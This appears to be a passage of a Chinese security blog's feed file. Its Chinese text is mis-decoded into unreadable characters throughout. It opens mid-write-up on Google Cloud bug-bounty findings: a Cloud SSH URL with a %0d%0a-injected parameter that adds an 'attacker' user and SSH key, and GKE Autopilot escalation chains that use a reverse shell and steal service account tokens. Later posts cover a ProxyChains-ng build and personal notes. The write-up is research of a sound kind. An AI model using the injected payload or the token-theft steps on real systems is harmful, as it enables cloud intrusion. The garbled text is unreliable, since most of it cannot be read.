äº†æ¢è¡Œç¬¦%0d%0aè¿”å›å­—ç¬¦ï¼š</p><pre><code>https://ssh.cloud.google.com/v2/ssh/projects/&#123;PROJECT-NAME&#125;/zones/&#123;INSTANCE-ZONE&#125;/instances/&#123;INSTANCE-NAME&#125;?newLinuxUsername=attacker:&#123;URL-ENCODED-SSH-PUBLIC-KEY&#125;%0d%0a</code></pre><p>æˆåŠŸç»•è¿‡äº†é™åˆ¶</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280919652.png" alt="image-20230628091912594"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280922300.png" alt="image-20230628092202263"></p><p>è‡³æ­¤å®ç°äº†ä¸€ä¸ªå¥‡è‘©æƒ…å†µä¸‹äº§ç”Ÿå¥‡è¿¹çš„RCE</p><h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-5"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-5" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>1.æµ‹è¯•å…¬æœ‰äº‘å‚å•†æ—¶ï¼Œå¤šå¤šç•™æ„å¸¦æœ‰é«˜å±æ“ä½œçš„åŠŸèƒ½ç‚¹ï¼Œè¯¸å¦‚å®ä¾‹ç”¨æˆ·æ·»åŠ ï¼ŒSSH Keyæ·»åŠ çš„åŠŸèƒ½ç‚¹ï¼Œä¸€ä½†å‡ºæ´ï¼Œä¾¿æ˜¯æƒŠæ¶›éª‡æµª</p><p>2.åœ¨æŸäº›æƒ…å†µä¸‹å¯å°è¯•ä½¿ç”¨%0d%0aç­‰control charsæ¯™æ‰ç¨‹åºåç«¯è‡ªåŠ¨ç”Ÿæˆçš„å†…å®¹ï¼Œè®©æˆ‘ä»¬çš„æ¼æ´è§¦å‘ç‚¹æ„é€ ä¸åˆ©ç”¨æ›´åŠ ä¸€å¸†é£é¡º</p><h2 id="1st-Prize-Privilege-escalations-in-GKE-Autopilot-133-337"><a href="#1st-Prize-Privilege-escalations-in-GKE-Autopilot-133-337" class="headerlink" title="1st Prize: Privilege escalations in GKE Autopilot - $133,337"></a>1st Prize: Privilege escalations in GKE Autopilot - $133,337</h2><p>ç»ˆäºæ¥åˆ°äº†top1çš„vulnï¼ˆ<a href="https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/%EF%BC%89">https://unit42.paloaltonetworks.com/gke-autopilot-vulnerabilities/ï¼‰</a></p><p>åœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œæ¼æ´å‘æ˜è€…æŒ–æ˜äº†æ•°æ¡æ”»å‡»è·¯å¾„ï¼Œè¿™äº›è·¯å¾„å…è®¸æœ‰æƒåœ¨ Autopilot é›†ç¾¤ä¸­åˆ›å»º Pod çš„æ”»å‡»è€…æå‡æƒé™å¹¶ç ´ååº•å±‚èŠ‚ç‚¹è™šæ‹Ÿæœºã€‚</p><p>Autopilotæ¶æ„çš„ç®€åŒ–å›¾å¦‚å›¾ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280950966.png" alt="A simplified diagram of Autopilot&#39;s architecture. Components unique to Autopilot are colored in green and shown with a number corresponding to their role from the list above. Unlike GKE Standard, where nodes are visible as Compute Engine VMs, Autopilot nodes are completely managed by Google, thus colored in green."></p><p>Autopilot ç‰¹æœ‰çš„ç»„ä»¶ä»¥ç»¿è‰²æ˜¾ç¤ºï¼Œå¹¶æ˜¾ç¤ºä¸ä¸Šé¢åˆ—è¡¨ä¸­çš„è§’è‰²å¯¹åº”çš„æ•°å­—ã€‚</p><p>ä¸ GKE Standard ä¸åŒï¼Œå…¶ä¸­èŠ‚ç‚¹æ˜¾ç¤ºä¸ºè®¡ç®—å¼•æ“è™šæ‹Ÿæœºï¼ŒAutopilot èŠ‚ç‚¹å®Œå…¨ç”± Google ç®¡ç†ï¼Œå› æ­¤æ˜¾ç¤ºä¸ºç»¿è‰²ã€‚</p><p>Autopilotå†…ç½®äº†å®‰å…¨ç­–ç•¥é˜²æ­¢è¿è¡ŒPrivileged Containerï¼ŒåŒæ—¶é˜»æ­¢ç”¨æˆ·è®¿é—®ç”± Google ç®¡ç†çš„ç¾¤é›†ç»„ä»¶ï¼ˆå¦‚èŠ‚ç‚¹ï¼‰; é˜²æ­¢ç”¨æˆ·è®¿é—®ç”± Google ç®¡ç†çš„ç¾¤é›†ç»„ä»¶ï¼ˆå¦‚èŠ‚ç‚¹ï¼‰ï¼Œä»¥é˜²æ­¢å®¹å™¨é€ƒé€¸å’Œå…¶ä»–æ”»å‡»é¢</p><p>å¦‚ä½œè€…ç»™å‡ºçš„å›¾æ‰€ç¤º</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306280955294.png" alt="image-20230628095555233"></p><p>ä½†æ˜¯ä½œè€…ä¾ç„¶ç»™å‡ºäº†ä¸€äº›å¯èƒ½çš„æ”»å‡»é¢</p><ol><li><p>GoogleCloudä¾é  Autopilot çš„ç­–ç•¥æ¥é˜²æ­¢æœ‰é£é™©çš„é…ç½®ã€‚</p><p>å¦‚æœæ”»å‡»è€…å¯ä»¥ä»¥æŸç§æ–¹å¼ç»•è¿‡è¯¥ç­–ç•¥ï¼Œä»–ä»¬å¯èƒ½ä¼šé€šè¿‡å®¢æˆ·æœŸæœ›è¢«é˜»æ­¢çš„æ–¹æ³•ï¼ˆä¾‹å¦‚éƒ¨ç½²ç‰¹æƒå®¹å™¨ï¼‰æ¥æå‡æƒé™ã€‚</p></li><li><p>Autopilot ç®¡ç†å‘˜æ²¡æœ‰å®Œå…¨ç‰¹æƒï¼Œå—å†…ç½®ç­–ç•¥çš„é™åˆ¶ï¼Œæ— æ³•è®¿é—®èŠ‚ç‚¹å’ŒæŸäº›ç‰¹æƒ Kubernetes APIã€‚</p><p>å¦‚æœæ”»å‡»è€…å¯ä»¥ç»•è¿‡Autopilotçš„ç­–ç•¥ï¼Œä»–ä»¬å¯èƒ½ä¼šè·å¾—æ¯”ç®¡ç†å‘˜æ›´é«˜çš„æƒé™ï¼Œä»è€Œä¸ºéšå½¢åé—¨æ‰“å¼€å¤§é—¨ã€‚</p></li></ol><h3 id="ç¬¬ä¸€æ¡æ”»å‡»é“¾"><a href="#ç¬¬ä¸€æ¡æ”»å‡»é“¾" class="headerlink" title="ç¬¬ä¸€æ¡æ”»å‡»é“¾"></a>ç¬¬ä¸€æ¡æ”»å‡»é“¾</h3><p>Autopilot ç¦æ­¢å¯èƒ½å…è®¸å®¹å™¨é€ƒé€¸çš„ Pod é…ç½®ã€‚ä¸ºäº†æ”¯æŒä¸€äº›ç‰¹æ®Šçš„nodeè®¿é—®çš„é™„åŠ ç»„ä»¶ï¼ŒAutopilot åˆ›å»ºäº†ä¸€ä¸ªå…è®¸åˆ—è¡¨workloadsçš„æ¦‚å¿µã€‚å¦‚æœå®¹å™¨ä¸å…è®¸åˆ—å‡ºçš„workloadsåŒ¹é…ï¼Œåˆ™å…è®¸å®ƒä½¿ç”¨å…è®¸åˆ—è¡¨å·¥ä½œè´Ÿè½½é…ç½®ä¸­æŒ‡å®šçš„ç‰¹æƒåŠŸèƒ½ã€‚æ¼æ´æŒ–æ˜è€…æµ‹è¯•æ—¶ï¼Œå”¯ä¸€åˆ—å…¥å…è®¸åˆ—è¡¨çš„workloadsæ˜¯ Datadog agent</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281001176.png" alt="In June, the only allow-listed workloads were Datadog agents."></p><p>ä¸‹é¢æ˜¯å¼•èµ·æ¼æ´å‘æ˜è€…æ³¨æ„çš„å…¶ä¸­ä¸€ä¸ª Datadog agentçš„allowListedworkLoadsé…ç½®ã€‚å¦‚æœå®¹å™¨æŒ‡å®šäº†åˆ—å‡ºçš„å‘½ä»¤å’Œæ˜ åƒï¼Œåˆ™å…è®¸å®ƒåœ¨åªè¯»å·ä¸­è£…è½½åˆ—å‡ºçš„ä¸»æœºè·¯å¾„ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281003231.png" alt="The screenshot shows the allow-listed workload configuration for one of the Datadog agents that caught our attention while searching for GKE Autopilot vulnerabilities. "></p><p>è¿™é‡Œçš„å®‰å…¨é—®é¢˜æ˜¯æ ¡éªŒä¸å……åˆ†ã€‚ä»…æ£€æŸ¥å‘½ä»¤å’Œæ˜ åƒä¸è¶³ä»¥ç¡®ä¿å®¹å™¨è¿è¡Œ Datadog ä»£ç ã€‚</p><p>ä½¿ç”¨ä»¥ä¸‹ PodSpecï¼Œå®¹å™¨å¯ä»¥åœ¨è¿è¡Œæ”»å‡»è€…æ§åˆ¶çš„ä»£ç æ—¶ä¼ªè£…æˆ Datadog agentï¼Œå¹¶æ»¥ç”¨æš´éœ²çš„ä¸»æœºå·è¿›è¡Œç ´åã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281006198.png" alt="Using the PodSpec shown here, a container can masquerade as the Datadog agent while running attacker-controlled code, and abuse the exposed host volumes to break out."></p><p>åœ¨ä¸‹é¢ä½œè€…ç»™å‡ºçš„è§†é¢‘ä¸­ï¼Œæ¶æ„ç”¨æˆ·éƒ¨ç½²äº†ä¸€ä¸ªä¼ªè£…æˆ Datadog ä»£ç†çš„å®¹å™¨ã€‚Pod é€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¥ç®¡å…¶åº•å±‚èŠ‚ç‚¹ï¼š</p><ol><li>æ»¥ç”¨æŒ‚è½½çš„ containerd socketæ¥åˆ›å»ºæŒ‚è½½ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„ç‰¹æƒå®¹å™¨ã€‚</li><li>è®©è¯¥ç‰¹æƒå®¹å™¨å®‰è£…ä¸€ä¸ª systemd æœåŠ¡ï¼Œè¯¥æœåŠ¡ä¼šè®©nodeæ´¾ç”Ÿä¸€ä¸ªåå‘shellç»™æ”»å‡»è€…</li></ol><p><a href="https://youtu.be/0cZJklJxTQk">https://youtu.be/0cZJklJxTQk</a></p><h3 id="ç¬¬äºŒæ¡æ”»å‡»é“¾"><a href="#ç¬¬äºŒæ¡æ”»å‡»é“¾" class="headerlink" title="ç¬¬äºŒæ¡æ”»å‡»é“¾"></a>ç¬¬äºŒæ¡æ”»å‡»é“¾</h3><p>ç¬¬äºŒæ¡æ”»å‡»è·¯å¾„æ¶‰åŠçš„æ¦‚å¿µè¾ƒå¤š</p><p>ç®€è€Œè¨€ä¹‹çš„è¯ï¼Œæ¼æ´å‘æ˜è€…å¼€å‘äº†ä¸€ä¸ª Python å·¥å…·ï¼Œå¯å°† Pod çš„æœåŠ¡å¸æˆ·æ˜ å°„åˆ°å®ƒä»¬çš„ Kubernetes æƒé™ï¼ˆå³è§’è‰²å’Œé›†ç¾¤è§’è‰²ï¼‰åä¸ºsa-hunter ã€‚</p><p>é€šè¿‡è¯¥å·¥å…·ï¼Œæ¼æ´æŒ–æ˜è€…å‘ç°é»˜è®¤å®‰è£…äº†ä¸¤ä¸ªåŠŸèƒ½å¼ºå¤§çš„ kube-system podï¼š<strong>stackdriver-metadata-agent-cluster-level</strong> <strong>å’Œ metrics-server</strong>ã€‚ä¸¤ä¸ª Pod éƒ½å¯ä»¥æ›´æ–°ç°æœ‰éƒ¨ç½²ã€‚</p><p>ä¹ä¸€çœ‹ï¼Œæ­¤æƒé™å¯èƒ½çœ‹èµ·æ¥æ˜¯æ— è¾œçš„ï¼Œä½†è¶³ä»¥æƒé™æå‡åˆ°cluster adminã€‚åŒæ—¶è¿™äº› Pod ä¹Ÿé»˜è®¤éƒ¨ç½²åœ¨GKE Standardä¸­ï¼Œè¿™ä½¿å¾—ä»¥ä¸‹æƒé™æå‡æŠ€æœ¯ä¸æ‰€æœ‰ GKE é›†ç¾¤ï¼ˆ<strong>GKE clusters, Standard and Autopilot</strong>ï¼‰ç›¸å…³ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281013990.png" alt="Privileged role assigned to the metrics-server pod can update deployments."></p><p>åç»­è·å–å¹¶æ”»å‡»æœåŠ¡è´¦æˆ·tokençš„æ”»å‡»è·¯å¾„ä½œè€…åŸæ–‡æè¿°å¦‚ä¸‹</p><blockquote><p>After taking over a node hosting either the stackdriver-metadata-agent-cluster-level or metrics-server pod, an attacker can harvest their service account token from the node filesystem. Armed with that token, the attacker can attain the privileges of any service account in the cluster with three simple steps:</p><ol><li><p>Update an existing deploymentâ€™s service account to the target service account. There are a number of preinstalled deployments, any one of which can be used for this step.</p></li><li><p>Add a malicious container to that deployment.</p></li><li><p>Have that malicious container retrieve the target service account token mounted in the container at &#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token.</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281018381.png" alt="Abusing deployment update privileges to obtain any service account&#39;s token."></p></li></ol></blockquote><p>kube-system namespaceæä¾›äº†è®¸å¤šé¢„å®‰è£…çš„ã€åŠŸèƒ½æå…¶å¼ºå¤§çš„æœåŠ¡å¸æˆ·å¯é€‰æ‹©ã€‚clusterrole-aggregation-controller (CRACï¼‰ æœåŠ¡å¸æˆ·å¯èƒ½æ˜¯ä¸»è¦å€™é€‰å¸æˆ·ï¼Œå› ä¸ºå®ƒå¯ä»¥å‘ç°æœ‰ç¾¤é›†è§’è‰²æ·»åŠ ä»»æ„æƒé™ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281020487.png" alt="The clusterrole-aggregation-controller service account can escalate cluster roles."></p><p>è·å– CRAC ä»¤ç‰Œåï¼Œæ”»å‡»è€…å¯ä»¥æ›´æ–°ç»‘å®šåˆ° CRAC çš„é›†ç¾¤è§’è‰²ä»¥æ‹¥æœ‰æ‰€æœ‰æƒé™ã€‚æ­¤æ—¶ï¼Œæ”»å‡»è€…å®é™…ä¸Šæ˜¯é›†ç¾¤ç®¡ç†å‘˜ï¼Œå¹¶ä¸”ä¸å— Autopilot ç­–ç•¥çš„çº¦æŸ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202306281022460.png" alt="image-20230628102225402"></p><p>ä½œè€…ç»™å‡ºçš„POCè§†é¢‘å¦‚ä¸‹ï¼š</p><p><a href="https://youtu.be/4Dddhk1QclY">https://youtu.be/4Dddhk1QclY</a></p><h3 id="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-6"><a href="#æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š-6" class="headerlink" title="æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š"></a><strong>æ¼æ´å‘æ˜çš„æ€è€ƒç‚¹ï¼š</strong></h3><p>1.æµ‹è¯•é›†ç¾¤æœåŠ¡æ—¶ï¼Œå¤šå¤šå…³æ³¨é›†ç¾¤æœåŠ¡ä¸­å…è®¸ä»¥ç‰¹æƒæ¨¡å¼è¿è¡Œçš„POD</p><p>2.å¤šå¤šç•™æ„é›†ç¾¤æœåŠ¡ä¸­preinstalled serviceçš„æƒé™è¯¯é…</p><h2 id="åè¨€ï¼š"><a href="#åè¨€ï¼š" class="headerlink" title="åè¨€ï¼š"></a>åè¨€ï¼š</h2><p>é€šè¿‡ä»¥ä¸Šä¸ƒä¸ªç²¾å¦™çš„æ¼æ´çš„å­¦ä¹ ä¸æ€è€ƒæ€»ç»“ï¼Œä¸ç”±å¾—æ…¨å¹ï¼šè€å¤–é¡¶çº§çš„æ¼æ´æŒ–æ˜è€…åŠŸåº•ä¹‹æ‰å®ï¼Œæ€è·¯ä¹‹é£éªšï¼Œæˆ‘ä»¬è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°</p><p>åšé‡‡å¤©ä¸‹ä¼—é•¿ï¼Œæ”˜å¤©ä¸‹ä¹‹å­¦è¯†ä¸ºæˆ‘æ‰€ç”¨â€”â€”æ˜¯æ–°æ—¶ä»£ä¼˜ç§€hackerä¸geekerçš„èƒ½åŠ›æ ‡é…</p>]]></content>
      
      
      <categories>
          
          <category> è®®é¢˜å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®®é¢˜å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac M1 Venturaè§£å†³ProxyChains-ngæ— æ³•æ­£å¸¸ä½¿ç”¨</title>
      <link href="/2023/04/24/Mac-M1-Ventura%E8%A7%A3%E5%86%B3ProxyChains-ng%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5/"/>
      <url>/2023/04/24/Mac-M1-Ventura%E8%A7%A3%E5%86%B3ProxyChains-ng%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-è¸©å‘"><a href="#0x00-è¸©å‘" class="headerlink" title="0x00 è¸©å‘"></a>0x00 è¸©å‘</h2><p>åœ¨Mac M1èŠ¯ç‰‡Venturaç³»ç»Ÿä¸­ç›´æ¥é€šè¿‡brewå®‰è£…Proxychains-ngä¼šå› ä¸ºVenturaç³»ç»ŸBug</p><p>å¯¼è‡´libproxychains4.dylibæ–‡ä»¶æ— æ³•æ­£å¸¸åŠ è½½</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304242141369.png" alt="image-20230424214130990"></p><p>Githubæ‰¾issueå’Œé‡‡ç”¨ç™¾åº¦æ¥çš„ç¼–è¯‘æ–¹æ³•å‡æ— æ³•è§£å†³ï¼Œæ€€ç–‘æ˜¯ç³»ç»Ÿå±‚çš„Bug</p><p>ç»è¿‡æŠ˜è…¾ï¼ŒæˆåŠŸæ‰¾äº†è§£å†³æ–¹æ¡ˆï¼Œå¼€ä¸ªæ–‡ç« è®°å½•ä¸€ä¸‹</p><h2 id="0x01-è§£å†³è¿‡ç¨‹"><a href="#0x01-è§£å†³è¿‡ç¨‹" class="headerlink" title="0x01 è§£å†³è¿‡ç¨‹"></a>0x01 è§£å†³è¿‡ç¨‹</h2><pre><code># æ¢å¤æ¨¡å¼å…³é—­sipcsrutil disable# æ‰“å¼€arm64eæ”¯æŒsudo nvram boot-args=-arm64e_preview_abiéšåé‡å¯Mac</code></pre><p>é‡å¯macå</p><pre><code>git clone https://github.com/rofl0r/proxychains-ng cd proxychains-ng CFLAGS=&quot;-arch arm64e&quot; LDFLAGS=&quot;-arch arm64e&quot; ./configure --prefix=/usr/local --bindir=/usr/local/bin --libdir=/usr/local/lib --fat-binary-m1  //ç¼–è¯‘arm64eé€‚ç”¨äºM1èŠ¯ç‰‡çš„è½¯ä»¶åŒ…make</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304242145053.png" alt="image-20230424214510023"></p><p>å¦‚å›¾</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304242145249.png" alt="image-20230424214557223"></p><pre><code>proxychains4 curl https://www.youtube.com</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304242147877.png" alt="image-20230424214709855"></p>]]></content>
      
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/04/19/hello-world/"/>
      <url>/2023/04/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Blogè¿ç§»åˆ°Githubçºªå¿µæ—¥</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023å¹´åˆæ„Ÿæ‚Ÿä¸é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäººåˆè®¢æœ¬</title>
      <link href="/2023/04/05/2023%E5%B9%B4%E5%88%9D%E6%84%9F%E6%82%9F%E4%B8%8E%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E5%90%88%E8%AE%A2%E6%9C%AC/"/>
      <url>/2023/04/05/2023%E5%B9%B4%E5%88%9D%E6%84%9F%E6%82%9F%E4%B8%8E%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E5%90%88%E8%AE%A2%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h2><p>ç»å†äº†å»å¹´ä¸€å¹´ç–«æƒ…å¤§èƒŒæ™¯ä¸‹çš„äº’è”ç½‘å¯’å†¬ï¼Œå¹´åˆæ—¶èŠ‚ï¼Œç»ˆäºç­‰åˆ°äº†æ˜¥å›å¤§åœ°ï¼Œç–«æƒ…æ—¶ä»£çš„åŸºæœ¬ç»“æŸã€‚ä½†æ˜¯å¾ˆé—æ†¾ï¼Œç»å†äº†å»å¹´çš„äºæŸåï¼Œç¬”è€…çš„å°å¾®ä¼ä¸šå·²ç»ç†¬ä¸è¿‡ä»Šå¹´å¹´ä¸­äº†ï¼Œä½œä¸ºä¸€ä¸ª20æ¥å²çš„åˆ›ä¸šè€…å‡†å¤‡ç”³è¯·è‚¡æƒè½¬è®©äº†ï¼Œé¢‡æœ‰äº›æ„Ÿæ…¨ã€‚è‡ªå·±å¿™é‡Œå¿™å¤–ï¼Œç»ˆç©¶è¿˜æ˜¯è¦è€è€å®å®åœ°æ”¾ä¸‹é‚£äº›ä¸åˆ‡å®é™…çš„æƒ³æ³•ï¼Œæ¥å—ç°å®å’Œå¸‚åœºçš„æ®‹é…·ã€‚</p><p>åšå…¬å¸å’Œä¸šåŠ¡çš„è¿™ä¸¤å¹´ï¼Œç¬”è€…ç»å†äº†å¾ˆå¤šï¼Œé™¤å»å°‘éƒ¨åˆ†æˆå•çš„ç»½æ”¾æ—¶åˆ»ï¼Œå¤§éƒ¨åˆ†æ—¶å€™å¤šçš„è¿˜æ˜¯è¢«äººå¿ƒå’Œäººæ€§æ‰“çš„é¼»é’è„¸è‚¿çš„æ„Ÿæ‚Ÿã€‚æ—¶æ—¶åˆ»åˆ»è€ƒè™‘ä¼ä¸šèƒ½å¦æ´»è¿‡ä¸‹ä¸€ä¸ªå­£åº¦ï¼Œè¿™è®©ä¸€ä¸ª20æ¥å²çš„å¹´è½»äººèº«å¿ƒä¿±ç–²ï¼Œæ„Ÿåˆ°è¿·æƒ˜ã€ä¸å®‰å’Œæµ®èºï¼Œè¿·å¤±äº†å¾ˆå¤šçš„åˆå¿ƒä¸çƒ­çˆ±ã€‚æ‰€ä»¥æˆ‘é€‰æ‹©ç»™è¶³è‡ªå·±æ²‰æ·€çš„æ—¶é—´ï¼Œå¯»è§…æœ¬å¿ƒï¼Œè€Œä¸æ˜¯åœ¨å¹´è½»åˆ°ä¸èƒ½å†å¹´è½»çš„å²æœˆé‡Œæ€¥äºæ±‚æˆã€‚</p><p>å¦‚ä»Šå›é¦–çœ‹æ¥ï¼Œå¯èƒ½åŒæ—¶åšæŠ€æœ¯å’Œå•†ä¸šçš„äººï¼Œå¿ƒä¸­æœ€çº¯ç²¹çš„ä¸œè¥¿å¯èƒ½ä¹Ÿåªå‰©ä¸‹æŠ€æœ¯äº†ã€‚ç¬”è€…å°æ—¶å€™è¢«é»‘å®¢çš„æ•…äº‹å¸å¼•ï¼Œä»å°åˆ°å¤§ï¼Œä¸€ä¸å°å¿ƒåšæŒå­¦ä¹ å®‰å…¨å·²ç»å¥½äº›å¹´äº†ï¼Œå—æ™ºå•†å’Œå¤©èµ‹æ‰€é™ï¼Œè‡ªå·±å­¦äº†æŒºä¹…ä¾ç„¶æ˜¯èœé¸¡æ°´å¹³ã€‚åœ¨å­¦å®‰å…¨çš„è¿™äº›å¹´è¢«æœ‹å‹ä»¬é—®åˆ°æœ€å¤šçš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯â€”â€”â€œæˆ‘å­¦äº†owasp top10æ¼æ´åŸºç¡€åï¼Œå¦‚ä½•æœ‰æ•ˆåœ°æŒ–æ˜æ¼æ´â€ï¼Œæ¯æ¬¡è¢«é—®åˆ°è¿™ç§é—®é¢˜ï¼Œæˆ‘è¯ç©·çš„å›ç­”éƒ½æ˜¯â€œè¡¥è¶³åŸºç¡€ï¼Œè¡¥è¶³åŸºç¡€ï¼Œè¡¥è¶³åŸºç¡€â€ã€‚</p><p><strong>åœ¨ç¬”è€…ä»…æœ‰çš„ä¸€ç‚¹çŸ¥è¯†å‚¨å¤‡é‡Œä¸­ï¼Œç¬”è€…ä¸€ç›´åšä¿¡ï¼Œåœ¨æ— è®ºåœ¨æ”»è¿˜æ˜¯é˜²ï¼Œåªè¦æ‹¿æå¥½å¼€å‘çš„ç‰¹æ€§ï¼Œè¿ç»´çš„ä¹ æ€§ï¼Œäººç±»çš„æœ¬æ€§â€”â€”å°±èƒ½æ— å¾€ä¸åˆ©</strong></p><p>å› æ­¤ç¬”è€…å°†è¿™ä¸€ä¸¤å¹´çš„æ–‡ç« æ”¶å½•èµ·æ¥åšæˆåˆè®¢æœ¬ï¼Œå…±12å°èŠ‚ï¼Œ12890å­—ï¼Œå¸Œæœ›å¤šå°‘èƒ½ç»™å¤§å®¶çœ‹åˆ°ä¸€äº›æœ‰è¶£çš„å®‰å…¨é—®é¢˜ã€‚åˆè®¢æœ¬æ–‡ç« ä¸­çš„å›¾éƒ½æ˜¯Pçš„ï¼Œä¸æ¶‰åŠä»»ä½•â€œå®é™…æ¼æ´â€å«ä¹‰ã€‚<strong>ç¬”è€…æƒ³è¯´ï¼Œåœ¨è¿™ä¸ªçŸ¥è¯†ä»˜è´¹ï¼ŒæŠ€æœ¯äººå‘˜ç¼ºé’±è°‹ç”Ÿå­˜ï¼Œå°å¾®ä¼ä¸šçš„å‘å±•ä¸¾æ­¥ç»´è‰°æ—¶ä»£é‡Œï¼ŒåšæŒåšå…è´¹çš„åˆ†äº«å®å±ä¸æ˜“ã€‚è¡£é£Ÿè¶³è€ŒçŸ¥è£è¾±ï¼Œä»“å»ªå®è€ŒçŸ¥ç¤¼èŠ‚ï¼Œå¾ˆé—æ†¾ï¼Œç¬”è€…æ˜¯ä¸ªä¸ºå½©ç¤¼å‘æ„ï¼Œæˆ¿å­ä¹Ÿä¹°ä¸èµ·çš„ç©·é¬¼ï¼ŒçŸ­æ—¶æœŸå†…ä¹Ÿæ— æ³•ç»§ç»­æ›´æ–°äº†ï¼Œè¦çœå‡ºæ—¶é—´å’Œç”Ÿæ´»å¯¹çº¿äº†ï¼Œå¸Œæœ›å„ä½ç†è§£ã€‚</strong></p><p><strong>å¦‚æœåŒ—äº¬æœ‰å‘ä½æ„¿æ„æ”¶ç•™ç¬”è€…ï¼Œä¹Ÿæ¬¢è¿ç§ä¿¡ç¬”è€…äº¤æµï¼Œæ„Ÿæ¿€ä¸å°½ã€‚å¸Œæœ›åœ¨å°†æ¥çš„æŸä¸€å¤©ï¼Œæˆ‘ä»¬åœ¨ä¸‹ä¸€åœºå±±æµ·ç›¸é‡ã€‚</strong></p><p><strong>ç¬”è€…vx:J0o1ey997ï¼Œä¹Ÿæ¬¢è¿å–œæ¬¢æŠ€æœ¯çš„å…„å¼Ÿä»¬ä¸€å—äº¤æµ</strong></p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192314016.png" alt="å›¾ç‰‡" style="zoom: 33%;" /><p><strong>éƒ¨åˆ†æˆªå›¾</strong></p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192314066.png" alt="å›¾ç‰‡" style="zoom:50%;" /><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192314114.png" alt="å›¾ç‰‡" style="zoom:50%;" /><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192314136.png" alt="å›¾ç‰‡" style="zoom:50%;" /><p><strong>ä¸‹è½½é“¾æ¥</strong></p><p><a href="https://github.com/J0o1ey/BountyHunterInChina/raw/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E5%90%88%E8%AE%A2%E6%9C%AC.pdf">https://github.com/J0o1ey/BountyHunterInChina/raw/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E5%90%88%E8%AE%A2%E6%9C%AC.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç”Ÿæ´»å¶æ‚Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(åäºŒ)-è®°ä¸€æ¬¡æœ€ç»ˆè¢«å¿½ç•¥çš„graphqlæ¼æ´æŒ–æ˜ç»å†</title>
      <link href="/2023/04/02/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%8D%81%E4%BA%8C-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%80%E7%BB%88%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84graphql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E5%8E%86/"/>
